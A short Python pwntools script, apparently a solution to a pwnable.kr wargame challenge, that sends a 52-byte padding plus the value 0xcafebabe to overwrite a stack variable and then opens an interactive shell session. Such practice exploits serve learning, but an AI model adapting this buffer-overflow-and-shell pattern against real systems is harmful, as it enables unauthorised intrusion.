from pwn import *

payload = b'A'*52 + b'\xbe\xba\xfe\xca'

r = remote('pwnable.kr', 9000)
r.sendline(payload)
r.interactive()